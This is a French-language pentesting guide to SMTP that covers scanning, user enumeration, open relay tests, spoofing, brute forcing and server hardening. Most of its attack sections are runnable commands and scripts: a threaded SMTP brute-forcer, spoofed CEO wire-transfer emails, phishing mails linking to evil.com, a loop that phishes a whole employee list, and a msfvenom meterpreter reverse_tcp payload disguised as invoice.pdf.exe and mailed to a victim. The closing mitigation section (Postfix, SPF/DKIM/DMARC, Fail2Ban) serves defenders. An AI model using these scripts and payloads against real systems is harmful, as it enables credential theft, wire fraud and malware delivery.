# 📧 SMTP - Guide Complet

Guide exhaustif pour l'énumération, l'exploitation et la sécurisation des services SMTP, un vecteur d'attaque crucial pour phishing, énumération et relais.

---

## 📖 Concepts de Base

### Qu'est-ce que le SMTP ?

Le **Simple Mail Transfer Protocol (SMTP)** est le protocole standard pour l'envoi d'emails. En pentesting, SMTP est important pour :
- Énumération d'utilisateurs (VRFY, EXPN, RCPT)
- Test d'open relay (spam/phishing)
- Email spoofing (si pas de SPF/DKIM/DMARC)
- Brute force d'authentification
- Phishing ciblé
- Command injection (rare)

**Ports SMTP** :
```
25      - SMTP (non chiffré)
465     - SMTPS (SSL/TLS direct)
587     - Submission (STARTTLS)
2525    - Alternative (non standard)
```

**Commandes SMTP** :
```
HELO/EHLO   - Présentation au serveur
MAIL FROM   - Définir expéditeur
RCPT TO     - Définir destinataire
DATA        - Début du message
VRFY        - Vérifier utilisateur
EXPN        - Expand mailing list
RSET        - Reset transaction
QUIT        - Fermer connexion
AUTH        - Authentification
STARTTLS    - Upgrade to TLS
```

---

## 1️⃣ Reconnaissance et Scan

### Détection de service

**Nmap** :
```bash
# Scan basique
nmap -p 25,465,587 target.com

# Scan avec version
nmap -p 25,465,587 -sV target.com

# Scan complet SMTP
nmap -p 25,465,587 -sV -sC target.com

# Scripts SMTP
nmap -p 25 --script smtp-* target.com

# Output
nmap -p 25,465,587 -sV -sC -oA smtp_scan target.com
```

**Scripts Nmap SMTP** :
```bash
# Commands supportées
nmap -p 25 --script smtp-commands target.com

# Énumération utilisateurs
nmap -p 25 --script smtp-enum-users target.com

# Énumération avec wordlist
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} target.com

# Open relay test
nmap -p 25 --script smtp-open-relay target.com

# Vulnérabilités
nmap -p 25 --script smtp-vuln* target.com

# NTLM info
nmap -p 587 --script smtp-ntlm-info target.com
```

**Banner Grabbing** :
```bash
# Netcat
nc -nv target.com 25

# Telnet
telnet target.com 25

# OpenSSL (SMTPS)
openssl s_client -connect target.com:465

# STARTTLS
openssl s_client -starttls smtp -connect target.com:587
```

---

### Énumération du serveur

**Connexion manuelle** :
```bash
# Port 25 (non chiffré)
telnet target.com 25

EHLO attacker.com
# Affiche capacités du serveur

HELO attacker.com
# Version simple

# Port 587 (STARTTLS)
openssl s_client -starttls smtp -connect target.com:587

# Port 465 (SSL/TLS)
openssl s_client -connect target.com:465
```

**Identifier capacités** :
```bash
telnet target.com 25
EHLO test.com

# Réponse exemple
250-mail.target.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-AUTH PLAIN LOGIN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
```

---

## 2️⃣ Énumération d'Utilisateurs

### VRFY Command

**Principe** : Vérifie si un utilisateur existe.

```bash
telnet target.com 25
VRFY root
250 2.1.5 root <root@target.com>

VRFY admin
250 2.1.5 admin <admin@target.com>

VRFY nonexistent
550 5.1.1 User unknown
```

**Script VRFY** :
```bash
#!/bin/bash
# smtp_vrfy.sh

SERVER=$1
USERS_FILE=$2

if [ -z "$SERVER" ] || [ -z "$USERS_FILE" ]; then
    echo "Usage: $0 <server> <users_file>"
    exit 1
fi

echo "[*] Testing SMTP VRFY on $SERVER"

while read user; do
    RESULT=$(echo "VRFY $user" | nc -w 2 $SERVER 25 2>/dev/null | grep "^250")
    
    if [ ! -z "$RESULT" ]; then
        echo "[+] User exists: $user"
        echo "    $RESULT"
    fi
done < $USERS_FILE
```

---

### EXPN Command

**Principe** : Développe une mailing list ou un alias.

```bash
telnet target.com 25
EXPN staff
250-admin@target.com
250-user1@target.com
250 user2@target.com

EXPN mailinglist
550 5.1.1 Mailbox does not exist
```

---

### RCPT TO Probing

**Principe** : Utiliser RCPT TO pour énumérer (plus discret que VRFY).

```bash
telnet target.com 25

HELO attacker.com
250 target.com

MAIL FROM:test@test.com
250 2.1.0 Ok

RCPT TO:admin@target.com
250 2.1.5 Ok

RCPT TO:nonexistent@target.com
550 5.1.1 User unknown

RSET
```

**Script RCPT enumeration** :
```python
#!/usr/bin/env python3
# smtp_rcpt_enum.py

import socket
import sys

def smtp_rcpt_enum(server, port, users_file):
    """Énumération via RCPT TO"""
    
    print(f"[*] Enumerating users on {server}:{port}")
    
    with open(users_file, 'r') as f:
        users = f.read().splitlines()
    
    found_users = []
    
    for user in users:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((server, port))
            
            # Banner
            banner = s.recv(1024)
            
            # HELO
            s.send(b'HELO attacker.com\r\n')
            s.recv(1024)
            
            # MAIL FROM
            s.send(b'MAIL FROM:test@test.com\r\n')
            s.recv(1024)
            
            # RCPT TO
            s.send(f'RCPT TO:{user}@{server}\r\n'.encode())
            response = s.recv(1024).decode()
            
            if '250' in response:
                print(f"[+] User exists: {user}")
                found_users.append(user)
            
            # RSET
            s.send(b'RSET\r\n')
            s.recv(1024)
            
            # QUIT
            s.send(b'QUIT\r\n')
            s.close()
            
        except Exception as e:
            pass
    
    print(f"\n[+] Found {len(found_users)} valid users")
    return found_users

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <server> <port> <users_file>")
        sys.exit(1)
    
    smtp_rcpt_enum(sys.argv[1], int(sys.argv[2]), sys.argv[3])
```

---

### smtp-user-enum

```bash
# Installation
git clone https://github.com/pentestmonkey/smtp-user-enum
cd smtp-user-enum

# VRFY mode
./smtp-user-enum.pl -M VRFY -U users.txt -t target.com

# EXPN mode
./smtp-user-enum.pl -M EXPN -U users.txt -t target.com

# RCPT mode
./smtp-user-enum.pl -M RCPT -U users.txt -t target.com

# Tous les modes
./smtp-user-enum.pl -M VRFY -M EXPN -M RCPT -U users.txt -t target.com

# Avec domaine
./smtp-user-enum.pl -M RCPT -U users.txt -D target.com -t target.com
```

---

## 3️⃣ Open Relay Testing

### Principe

Un **open relay** permet d'envoyer des emails via le serveur sans authentification, utilisable pour spam/phishing.

### Test manuel

```bash
telnet target.com 25

HELO attacker.com
250 target.com

MAIL FROM:external@evil.com
250 2.1.0 Ok

RCPT TO:victim@another-domain.com
250 2.1.5 Ok    # Si accepté = Open Relay!

DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Test Open Relay
This is a test message from an open relay.
.
250 2.0.0 Ok: queued

QUIT
```

**Si le serveur accepte** : Open Relay confirmé (vulnérabilité critique).

---

### Test automatisé

**Nmap** :
```bash
nmap -p 25 --script smtp-open-relay target.com

# Avec domaines custom
nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.domain=test.com,smtp-open-relay.to=victim@target2.com target.com
```

**Script Python** :
```python
#!/usr/bin/env python3
# smtp_open_relay.py

import smtplib
import sys

def test_open_relay(server, port=25):
    """Test si le serveur est un open relay"""
    
    print(f"[*] Testing open relay on {server}:{port}")
    
    sender = "test@external.com"
    recipient = "victim@another-domain.com"
    message = """Subject: Open Relay Test
From: {}
To: {}

This is a test message to verify open relay.
""".format(sender, recipient)
    
    try:
        smtp = smtplib.SMTP(server, port, timeout=10)
        smtp.set_debuglevel(1)
        
        smtp.helo('attacker.com')
        smtp.mail(sender)
        smtp.rcpt(recipient)
        smtp.data(message)
        smtp.quit()
        
        print("\n[!] VULNERABLE: Server is an open relay!")
        return True
        
    except smtplib.SMTPRecipientsRefused:
        print("\n[+] NOT vulnerable: Relay denied")
        return False
    except Exception as e:
        print(f"\n[-] Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <server> [port]")
        sys.exit(1)
    
    server = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 25
    
    test_open_relay(server, port)
```

---

## 4️⃣ Email Spoofing

### Principe

Si le serveur n'implémente pas SPF/DKIM/DMARC correctement, on peut usurper l'adresse expéditeur.

### Spoofing manuel

```bash
telnet target.com 25

HELO attacker.com
250 target.com

MAIL FROM:ceo@target.com
250 2.1.0 Ok

RCPT TO:employee@target.com
250 2.1.5 Ok

DATA
354 End data with <CR><LF>.<CR><LF>
From: CEO <ceo@target.com>
To: employee@target.com
Subject: Urgent - Wire Transfer

Please transfer $50,000 to account XYZ immediately.

Best regards,
CEO
.
250 2.0.0 Ok: queued

QUIT
```

---

### Spoofing avec swaks

```bash
# Installation
apt install swaks

# Spoofing basique
swaks --to victim@target.com \
      --from ceo@target.com \
      --server target.com \
      --body "Please transfer funds immediately"

# Avec sujet personnalisé
swaks --to victim@target.com \
      --from ceo@target.com \
      --server target.com \
      --header "Subject: Urgent Request" \
      --body "Transfer $50,000 to account 123456"

# Avec authentification (si requis)
swaks --to victim@target.com \
      --from admin@target.com \
      --server target.com \
      --auth PLAIN \
      --auth-user admin@target.com \
      --auth-password password123 \
      --header "Subject: Test" \
      --body "Test message"

# HTML email
swaks --to victim@target.com \
      --from ceo@target.com \
      --server target.com \
      --header "Subject: Important" \
      --header "Content-Type: text/html" \
      --body "<html><body><h1>Urgent Request</h1><p>Transfer funds now</p></body></html>"

# Avec pièce jointe
swaks --to victim@target.com \
      --from ceo@target.com \
      --server target.com \
      --header "Subject: Invoice" \
      --attach invoice.pdf \
      --body "Please see attached invoice"
```

---

### Vérification SPF/DKIM/DMARC

```bash
# SPF record
dig TXT target.com | grep spf

# DKIM record
dig TXT default._domainkey.target.com

# DMARC record
dig TXT _dmarc.target.com

# Si absents ou mal configurés = spoofing possible
```

**Tester SPF** :
```bash
# Bon SPF
v=spf1 ip4:1.2.3.4 include:_spf.google.com -all

# Mauvais SPF (permissif)
v=spf1 +all
v=spf1 ~all
```

---

## 5️⃣ Brute Force Authentication

### Hydra

```bash
# USER connu
hydra -l admin@target.com -P passwords.txt smtp://target.com:587

# Liste d'utilisateurs
hydra -L emails.txt -P passwords.txt smtp://target.com:587

# Avec STARTTLS
hydra -l admin@target.com -P passwords.txt -s 587 smtp://target.com

# Threads
hydra -l admin@target.com -P passwords.txt -t 4 smtp://target.com:587

# Output
hydra -l admin@target.com -P passwords.txt smtp://target.com:587 -o smtp_creds.txt
```

---

### Metasploit

```bash
msfconsole

# SMTP login scanner
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS target.com
set USER_FILE users.txt
run

# SMTP version scanner
use auxiliary/scanner/smtp/smtp_version
set RHOSTS 192.168.1.0/24
run

# SMTP relay check
use auxiliary/scanner/smtp/smtp_relay
set RHOSTS target.com
run
```

---

### Script Python

```python
#!/usr/bin/env python3
# smtp_brute.py

import smtplib
import sys
from concurrent.futures import ThreadPoolExecutor

def try_login(server, port, email, password, use_tls=True):
    """Essaie une combinaison email/password"""
    try:
        if use_tls:
            smtp = smtplib.SMTP(server, port, timeout=10)
            smtp.starttls()
        else:
            smtp = smtplib.SMTP_SSL(server, port, timeout=10)
        
        smtp.login(email, password)
        smtp.quit()
        return (email, password, True)
    except smtplib.SMTPAuthenticationError:
        return (email, password, False)
    except Exception as e:
        return (email, password, False)

def brute_force(server, port, emails, passwords, threads=5, use_tls=True):
    """Brute force SMTP authentication"""
    
    print(f"[*] Starting SMTP brute force on {server}:{port}")
    print(f"[*] Emails: {len(emails)}, Passwords: {len(passwords)}")
    print(f"[*] Total attempts: {len(emails) * len(passwords)}\n")
    
    attempts = []
    for email in emails:
        for password in passwords:
            attempts.append((server, port, email.strip(), password.strip(), use_tls))
    
    found = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(lambda x: try_login(*x), attempts)
        
        for email, password, success in results:
            if success:
                print(f"[+] SUCCESS: {email}:{password}")
                found.append((email, password))
    
    return found

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <server> <port> <emails_file> <passwords_file>")
        print(f"Example: {sys.argv[0]} smtp.target.com 587 emails.txt passwords.txt")
        sys.exit(1)
    
    server = sys.argv[1]
    port = int(sys.argv[2])
    
    with open(sys.argv[3]) as f:
        emails = f.readlines()
    
    with open(sys.argv[4]) as f:
        passwords = f.readlines()
    
    use_tls = (port == 587)  # STARTTLS pour port 587
    
    results = brute_force(server, port, emails, passwords, use_tls=use_tls)
    
    if results:
        print(f"\n[+] Found {len(results)} valid credentials")
    else:
        print("\n[-] No valid credentials found")
```

---

## 6️⃣ Phishing via SMTP

### Email phishing simple

```bash
# Avec swaks
swaks --to victim@company.com \
      --from it-support@company.com \
      --server smtp.company.com \
      --header "Subject: Password Reset Required" \
      --header "Content-Type: text/html" \
      --body "<html><body>
<p>Dear User,</p>
<p>Your password will expire in 24 hours.</p>
<p>Please reset it here: <a href='http://evil.com/reset'>Reset Password</a></p>
<p>IT Support</p>
</body></html>"
```

---

### Email avec pièce jointe malveillante

```bash
# Créer payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > invoice.exe

# Renommer
mv invoice.exe invoice.pdf.exe

# Envoyer
swaks --to victim@company.com \
      --from accounting@company.com \
      --server smtp.company.com \
      --header "Subject: Invoice #12345" \
      --attach invoice.pdf.exe \
      --body "Please find attached invoice for review"
```

---

### Campagne de phishing (Gophish)

```bash
# Installation
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish

# Configuration
# Éditer config.json pour SMTP settings

# Lancer
./gophish

# Interface web
https://localhost:3333
# Default: admin / gophish
```

---

## 7️⃣ SMTP Smuggling & Injection

### SMTP Command Injection

**Rare mais possible si input mal filtré** :

```bash
# Tenter injection dans headers
MAIL FROM:attacker@evil.com\r\nDATA\r\nSubject: Injected\r\n.\r\n

# Ou dans body via application web
# Form field:
email = "victim@target.com\nBCC: attacker@evil.com"
```

---

### SMTP Smuggling (CVE-2023-51713)

```bash
# Exploitation nécessite conditions spécifiques
# Permet de contourner SPF/DKIM

# Exemple payload
MAIL FROM:<sender@attacker.com>
RCPT TO:<victim@target.com>
DATA
From: legitimate@target.com
To: victim@target.com
Subject: Test

Body with special <CR><LF> sequences
.
```

---

## 8️⃣ Protection et Mitigation

### Sécurisation du serveur SMTP

**Postfix configuration** :
```bash
# /etc/postfix/main.cf

# Désactiver VRFY
disable_vrfy_command = yes

# Restrictions relay
smtpd_relay_restrictions = 
    permit_mynetworks,
    permit_sasl_authenticated,
    reject_unauth_destination

# Authentification requise
smtpd_sasl_auth_enable = yes
smtpd_sasl_security_options = noanonymous
broken_sasl_auth_clients = yes

# TLS
smtpd_tls_cert_file=/etc/ssl/certs/smtp.crt
smtpd_tls_key_file=/etc/ssl/private/smtp.key
smtpd_use_tls=yes
smtpd_tls_security_level=may

# Rate limiting
smtpd_client_connection_rate_limit = 10
smtpd_error_sleep_time = 5s
smtpd_soft_error_limit = 2
smtpd_hard_error_limit = 5

# SPF check
smtpd_recipient_restrictions =
    permit_mynetworks,
    permit_sasl_authenticated,
    reject_invalid_hostname,
    reject_non_fqdn_sender,
    reject_non_fqdn_recipient,
    reject_unknown_sender_domain,
    reject_unknown_recipient_domain,
    reject_unauth_destination,
    check_policy_service unix:private/policyd-spf
```

---

### Implémenter SPF/DKIM/DMARC

**SPF Record** :
```bash
# DNS TXT record pour example.com
v=spf1 ip4:1.2.3.4 include:_spf.google.com -all

# Explications
v=spf1        # Version SPF
ip4:1.2.3.4   # IP autorisée
include:...   # Inclure autre SPF
-all          # Reject tout le reste (strict)
~all          # Soft fail (moins strict)
```

**DKIM** :
```bash
# Générer clés DKIM
opendkim-genkey -s default -d example.com

# Publier clé publique en DNS
default._domainkey.example.com IN TXT "v=DKIM1; k=rsa; p=MIIB..."

# Configuration OpenDKIM
# /etc/opendkim.conf
Domain                  example.com
KeyFile                 /etc/opendkim/keys/default.private
Selector                default
```

**DMARC** :
```bash
# DNS TXT record pour _dmarc.example.com
v=DMARC1; p=reject; rua=mailto:dmarc@example.com; ruf=mailto:dmarc@example.com; pct=100

# Explications
v=DMARC1                      # Version
p=reject                      # Policy (reject/quarantine/none)
rua=mailto:dmarc@example.com  # Aggregate reports
ruf=mailto:dmarc@example.com  # Forensic reports
pct=100                       # Pourcentage (100 = tous)
```

---

### Fail2Ban pour SMTP

```bash
# /etc/fail2ban/jail.local

[postfix]
enabled = true
port = smtp,ssmtp,submission
filter = postfix
logpath = /var/log/mail.log
maxretry = 5
bantime = 3600

[postfix-sasl]
enabled = true
port = smtp,ssmtp,submission
filter = postfix-sasl
logpath = /var/log/mail.log
maxretry = 3
bantime = 7200
```

---

### Monitoring

```bash
# Logs Postfix
tail -f /var/log/mail.log

# Failed auth attempts
grep "authentication failed" /var/log/mail.log

# Relay attempts
grep "Relay access denied" /var/log/mail.log

# Top senders
grep "from=" /var/log/mail.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20

# Top recipients
grep "to=" /var/log/mail.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20
```

---

## 9️⃣ Cas Pratiques

### Scénario 1: SMTP avec VRFY activé

```bash
# Scan
nmap -p 25 --script smtp-commands target.com

# Résultat
250-VRFY

# Énumération
smtp-user-enum.pl -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t target.com

# Résultats
admin@target.com exists
root@target.com exists
user@target.com exists

# Exploitation
# Créer liste emails found
# Brute force avec hydra
hydra -L found_emails.txt -P passwords.txt smtp://target.com:587
```

---

### Scénario 2: Open Relay

```bash
# Test
nmap -p 25 --script smtp-open-relay target.com

# Résultat
Server is an open relay!

# Exploitation phishing
swaks --to employee1@company.com \
      --from ceo@company.com \
      --server target.com \
      --header "Subject: Urgent - Credentials Update" \
      --header "Content-Type: text/html" \
      --body "<html>Visit http://evil.com/login to update</html>"

# Répéter pour toute la liste
while read email; do
    swaks --to $email --from ceo@company.com --server target.com --header "Subject: Urgent" --body "Phishing content"
done < employee_emails.txt
```

---

### Scénario 3: Pas de SPF/DKIM

```bash
# Vérifier SPF
dig TXT target.com | grep spf
# Résultat: aucun

# Vérifier DKIM
dig TXT default._domainkey.target.com
# Résultat: aucun

# Spoofing facile
swaks --to victim@target.com \
      --from boss@target.com \
      --server smtp.target.com \
      --header "Subject: Wire Transfer" \
      --body "Transfer $100,000 to account XYZ"

# Victime voit: From: boss@target.com (légitime en apparence)
```

---

## 🔟 Cheatsheet Rapide

```bash
# === RECONNAISSANCE ===

# Scan
nmap -p 25,465,587 -sV -sC target.com
nmap -p 25 --script smtp-* target.com

# Banner
nc target.com 25
telnet target.com 25
openssl s_client -starttls smtp -connect target.com:587

# Commands
telnet target.com 25
EHLO test


# === ÉNUMÉRATION USERS ===

# VRFY
echo "VRFY admin" | nc target.com 25

# smtp-user-enum
smtp-user-enum.pl -M VRFY -U users.txt -t target.com
smtp-user-enum.pl -M RCPT -U users.txt -t target.com

# Nmap
nmap -p 25 --script smtp-enum-users target.com


# === OPEN RELAY ===

# Test
nmap -p 25 --script smtp-open-relay target.com

# Manuel
telnet target.com 25
MAIL FROM:external@evil.com
RCPT TO:victim@other.com
# Si accepté = open relay


# === SPOOFING ===

# swaks
swaks --to victim@target.com \
      --from ceo@target.com \
      --server target.com \
      --body "Urgent request"

# Vérifier protections
dig TXT target.com | grep spf
dig TXT _dmarc.target.com


# === BRUTE FORCE ===

# Hydra
hydra -l admin@target.com -P passwords.txt smtp://target.com:587

# Metasploit
use auxiliary/scanner/smtp/smtp_enum


# === SÉCURISATION ===

# Désactiver VRFY
disable_vrfy_command = yes

# SPF
v=spf1 ip4:1.2.3.4 -all

# DMARC
v=DMARC1; p=reject;

# Fail2Ban
[postfix]
enabled = true
maxretry = 5
```

---

## 1️⃣1️⃣ Ressources

**Documentation** :
- **SMTP RFC 5321** : https://tools.ietf.org/html/rfc5321
- **SPF RFC 7208** : https://tools.ietf.org/html/rfc7208
- **DKIM RFC 6376** : https://tools.ietf.org/html/rfc6376
- **DMARC RFC 7489** : https://tools.ietf.org/html/rfc7489

**Outils** :
- **swaks** : http://www.jetmore.org/john/code/swaks/
- **smtp-user-enum** : https://github.com/pentestmonkey/smtp-user-enum
- **Gophish** : https://getgophish.com/

**Tests** :
- **MXToolbox** : https://mxtoolbox.com/
- **Mail-Tester** : https://www.mail-tester.com/
- **DMARC Analyzer** : https://dmarcian.com/

**Pentesting** :
- **HackTricks SMTP** : https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
- **OWASP Email** : https://owasp.org/www-community/attacks/

**Labs** :
- **HackTheBox** : SMTP-based challenges
- **TryHackMe** : Network Services room

---

## 1️⃣2️⃣ Tips Pro

1. **VRFY souvent désactivé** : utiliser RCPT TO à la place
2. **EXPN sous-utilisé** : révèle mailing lists
3. **Open relay = critical** : permet spam massif
4. **SPF/DKIM/DMARC essentiels** : vérifier toujours
5. **Port 587 > Port 25** : STARTTLS plus moderne
6. **swaks = outil ultime** : testing SMTP complet
7. **Enumeration discrète** : RCPT moins logué que VRFY
8. **Phishing crédible** : spoofing + HTML + attachments
9. **Rate limiting crucial** : éviter ban IP
10. **Gophish pour campagnes** : tracking + templates
11. **Fail2Ban nécessaire** : brute force très courant
12. **Logs mail.log précieux** : forensics complet
13. **TLS obligatoire** : credentials en clair sinon
14. **NTLM info leaks** : révèle version Windows
15. **SMTP smuggling émergent** : CVE récents à suivre

---

**🎯 SMTP = vecteur d'attaque sous-estimé mais très efficace pour phishing et reconnaissance !**

**Tags:** `#smtp #email #phishing #spoofing #open-relay #spf #dkim #dmarc #vrfy #swaks #enumeration`
